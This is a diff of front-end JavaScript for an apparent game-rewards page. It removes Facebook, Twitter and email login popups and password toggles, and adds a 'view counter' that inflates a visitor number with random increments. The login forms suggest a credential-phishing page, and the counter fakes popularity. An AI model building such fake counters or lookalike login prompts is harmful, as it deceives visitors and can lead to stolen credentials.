@@ -1,309 +1,62 @@
-// code for activate clicked sound
-var buka = new Audio();
-buka.src = "media/open.mp3";
+function cleanInput(input) {
+    input.value = input.value.replace(/\(\d+\)/g, '');
+}
 
-var tutup = new Audio();
-tutup.src = "media/close.mp3";
-
-// code for showing hiding popup
-function audioFiles() {
-    var audio = document.getElementById('audioFiles');  
-    audio.play();
-}
-$(document).ready(function() {
-    $("o").attr("onclick", "audioFiles()");  
-});
-// code for showing hiding popup
-function open_find_id() {
-    $('.find_id').show();
-}
-function close_find_id() {
-    $('.find_id').hide();
-}
-function close_itemReward_confirmation() {
-    $('.itemReward_confirmation').hide();
-}
-function open_itemReward_confirmation(ag) {
-    var itemReward_confirmationImg = $(ag).attr("src");
-    var rewardName = $(ag).attr("data-name");
-    var amount = $(ag).attr("data-id");
-    var price = $(ag).attr("value");
-    $('.itemReward_confirmation').show();   
-    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
-    $('#rewardName').html(rewardName);
-    $('#amount').html(amount);
-    $('#price').html(price);
-}
-function merah() {
-    document.getElementById('changebg').style.backgroundImage="url(img/bg_item/merah.jpg)";
-}
-function pink() {
-    document.getElementById('changebg').style.backgroundImage="url(img/bg_item/pink.jpg)";
-}
-function ungu() {
-    document.getElementById('changebg').style.backgroundImage="url(img/bg_item/ungu.jpg)";
-}
-function biru() {
-    document.getElementById('changebg').style.backgroundImage="url(img/bg_item/biru.jpg)";
-}
-function hijau() {
-    document.getElementById('changebg').style.backgroundImage="url(img/bg_item/hijau.jpg)";
-}
-function open_otherReward_confirmation(ag) {
-    var otherReward_confirmationImg = $(ag).attr("src");
-	var otherReward_confirmationValue = $(ag).attr("value");
-    $('.otherReward_confirmation').show();
-    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
-	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
-}
-function open_once_confirmation() {
-    $('.once_confirmation').show();
-}
-function open_many_confirmation() {
-    $('.many_confirmation').show();
-}
-function open_once_rewards() {
-    $('.once_rewards').show();
-	$(".once_confirmation").hide()
-}
-function open_many_rewards() {
-    $('.many_rewards').show();
-	$(".many_confirmation").hide()
-}
-function open_facebook() {
-    $('.login-facebook').show();
-    $('.account_login').hide();
-}
-function open_twitter() {
-    $('.login-twitter').show();
-    $('.account_login').hide();
-}
-function close_rewards() {
-    $(".once_confirmation").hide()
-    $(".many_confirmation").hide()
-	$(".once_rewards").hide()
-    $(".many_rewards").hide()
-}
-function tutup_facebook() {
-    $('.login-facebook').hide()
-    $('.account_login').show();
-}
-function tutup_twitter() {
-    $('.login-twitter').hide()
-    $('.account_login').show();
-}
-function et() {
-  $('.et').show();    
-  $('.nt').hide();  
-} 
-function nt() {
-  $('.nt').show();    
-  $('.et').hide();    
-}
-function open_link() {
-  $('.login-mail').show()
-  $('.account_login').hide()
-}
-function close_link() {
-  $('.login-mail').hide()
-  $('.account_login').show()
-}
-// kode untuk ganti gambar header otomatis
-var slideIndexHeader = 0;
-showSlidesHeader();
-function showSlidesHeader() {
-    var i;
-    var slidesHeader = document.getElementsByClassName("sliderHeader");
-    for (i = 0; i < slidesHeader.length; i++) {
-        slidesHeader[i].style.display = "none"; 
+// --- View Counter ---
+(function () {
+    var el = document.querySelector('.stats-number');
+    if (!el) return;
+    var current = 56373;
+    function formatNumber(n) { return n.toLocaleString('de-DE'); }
+    function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+    function animateCount(from, to, duration, onDone) {
+        var steps = 30, stepTime = duration / steps, diff = to - from, step = 0;
+        var interval = setInterval(function() {
+            step++;
+            var eased = 1 - Math.pow(1 - step / steps, 2);
+            el.textContent = formatNumber(Math.round(from + diff * eased));
+            if (step >= steps) { clearInterval(interval); current = to; el.textContent = formatNumber(current); if (onDone) onDone(); }
+        }, stepTime);
     }
-    slideIndexHeader++;
-    if (slideIndexHeader > slidesHeader.length) {slideIndexHeader = 1} 
-    slidesHeader[slideIndexHeader-1].style.display = "block"; 
-    setTimeout(showSlidesHeader, 2600);
-}
-function openloginlink(evt, loginlink) {
-    var i, form_login, form_login_link;
-    form_login = document.getElementsByClassName("form_login");
-    for (i = 0; i < form_login.length; i++) {
-        form_login[i].style.display = "none";        
+    function scheduleNext() {
+        var type = Math.random(), change;
+        if (type < 0.5) change = randomInt(1, 30);
+        else if (type < 0.8) change = randomInt(30, 150);
+        else change = randomInt(150, 600);
+        setTimeout(function() { animateCount(current, current + change, randomInt(400, 1200), scheduleNext); }, randomInt(800, 4000));
     }
-    form_login_link = document.getElementsByClassName("seclink-content");
-    for (i = 0; i < form_login_link.length; i++) {
-        form_login_link[i].className = form_login_link[i].className.replace(" seclink-content-active", "");
-    }
-    document.getElementById(loginlink).style.display = "block";
-    evt.currentTarget.className += " seclink-content-active";
-}
-document.getElementById("email-login").click();
+    el.textContent = formatNumber(current);
+    scheduleNext();
+})();
 
-// show hide password for facebook
+// --- Tab Rewards (hanya jalankan kalau elemen ada) ---
+function openRewards(evt, rewardsClass) {
+    var i, tab_rewards = document.getElementsByClassName("tab_rewards");
+    var tab_rewards_link = document.getElementsByClassName("menu-content");
+    for (i = 0; i < tab_rewards.length; i++) tab_rewards[i].style.display = "none";
+    for (i = 0; i < tab_rewards_link.length; i++) tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
+    document.getElementById(rewardsClass).style.display = "block";
+    evt.currentTarget.className += " menu-content-active";
+}
+if (document.getElementById("defaultTabRewards")) document.getElementById("defaultTabRewards").click();
 
-function showFbPassword() {
-  var x = document.getElementById("selowpw-fb");
-  if (x.type === "password") {
-    x.type = "text";
-	$('.showPassword').hide();
-	$('.hidePassword').show();
-  } else {
-    x.type = "password";
-  }
+function openReward(evt, rewardsClass) {
+    var i, item_rewardx = document.getElementsByClassName("item_rewardx");
+    var item_rewardx_link = document.getElementsByClassName("menu-contentx");
+    for (i = 0; i < item_rewardx.length; i++) item_rewardx[i].style.display = "none";
+    for (i = 0; i < item_rewardx_link.length; i++) item_rewardx_link[i].className = item_rewardx_link[i].className.replace(" menu-contentx-actives", "");
+    document.getElementById(rewardsClass).style.display = "block";
+    evt.currentTarget.className += " menu-contentx-actives";
 }
-function hideFbPassword() {
-  var x = document.getElementById("selowpw-fb");
-  if (x.type === "text") {
-    x.type = "password";
-	$('.showPassword').show();
-	$('.hidePassword').hide();
-  } else {
-    x.type = "text";
-  }
-}
-// show hide password for twitter
-function showTwitterPassword() {
-  var x = document.getElementById("selowpw-tw");
-  if (x.type === "password") {
-    x.type = "text";
-	$('.TwitterShowPassword').hide();
-	$('.TwitterHidePassword').show();
-  } else {
-    x.type = "password";
-  }
-}
-function hideTwitterPassword() {
-  var x = document.getElementById("selowpw-tw");
-  if (x.type === "text") {
-    x.type = "password";
-	$('.TwitterShowPassword').show();
-	$('.TwitterHidePassword').hide();
-  } else {
-    x.type = "text";
-  }
-}
-function showFbPassword() {
-  var x = document.getElementById("password-facebook");
-  if (x.type === "password") {
-    x.type = "text";
-	$('.showPassword').hide();
-	$('.hidePassword').show();
-  } else {
-    x.type = "password";
-  }
-}
-function hideFbPassword() {
-  var x = document.getElementById("password-facebook");
-  if (x.type === "text") {
-    x.type = "password";
-	$('.showPassword').show();
-	$('.hidePassword').hide();
-  } else {
-    x.type = "text";
-  }
-}
+if (document.getElementById("defaultrewards")) document.getElementById("defaultrewards").click();
 
-// show hide password for twitter
-function showTwitterPassword() {
-  var x = document.getElementById("password-twitter");
-  if (x.type === "password") {
-    x.type = "text";
-	$('.TwitterShowPassword').hide();
-	$('.TwitterHidePassword').show();
-  } else {
-    x.type = "password";
-  }
-}
-function hideTwitterPassword() {
-  var x = document.getElementById("password-twitter");
-  if (x.type === "text") {
-    x.type = "password";
-	$('.TwitterShowPassword').show();
-	$('.TwitterHidePassword').hide();
-  } else {
-    x.type = "text";
-  }
-}
-
-function showFbPasswordS() {
-  var x = document.getElementById("sec-password-facebook");
-  if (x.type === "password") {
-    x.type = "text";
-    $('.showPassword').hide();
-    $('.hidePassword').show();
-  } else {
-    x.type = "password";
-  }
-}
-function hideFbPasswordS() {
-  var x = document.getElementById("sec-password-facebook");
-  if (x.type === "text") {
-    x.type = "password";
-    $('.showPassword').show();
-    $('.hidePassword').hide();
-  } else {
-    x.type = "text";
-  }
-}
-function showTwitterPasswordS() {
-  var x = document.getElementById("sec-password-twitter");
-  if (x.type === "password") {
-      x.type = "text";
-      $('.TwitterShowPassword').hide();
-      $('.TwitterHidePassword').show();
-  } else {
-      x.type = "password";
-  }
-}
-function hideTwitterPasswordS() {
-  var x = document.getElementById("sec-password-twitter");
-  if (x.type === "text") {
-      x.type = "password";
-      $('.TwitterShowPassword').show();
-      $('.TwitterHidePassword').hide();
-  } else {
-      x.type = "text";
-  }
-}
-
-// show hide password for facebook
-function SecshowFbPassword() {
-  var x = document.getElementById("sec-password-facebook");
-  if (x.type === "password") {
-    x.type = "text";
-	$('.showPassword').hide();
-	$('.hidePassword').show();
-  } else {
-    x.type = "password";
-  }
-}
-function SechideFbPassword() {
-  var x = document.getElementById("sec-password-facebook");
-  if (x.type === "text") {
-    x.type = "password";
-	$('.showPassword').show();
-	$('.hidePassword').hide();
-  } else {
-    x.type = "text";
-  }
-}
-
-// show hide password for twitter
-function SecshowTwitterPassword() {
-  var x = document.getElementById("sec-password-twitter");
-  if (x.type === "password") {
-    x.type = "text";
-	$('.TwitterShowPassword').hide();
-	$('.TwitterHidePassword').show();
-  } else {
-    x.type = "password";
-  }
-}
-function SechideTwitterPassword() {
-  var x = document.getElementById("sec-password-twitter");
-  if (x.type === "text") {
-    x.type = "password";
-	$('.TwitterShowPassword').show();
-	$('.TwitterHidePassword').hide();
-  } else {
-    x.type = "text";
-  }
+// --- Send UID ---
+var sendUID = document.getElementById('sendUID');
+if (sendUID) {
+    sendUID.addEventListener('click', function(e) {
+        e.preventDefault();
+        var myText = document.getElementById("playid");
+        var myDiv = document.getElementById("uid");
+        if (myText && myDiv) myDiv.innerHTML = myText.value;
+    });
 }
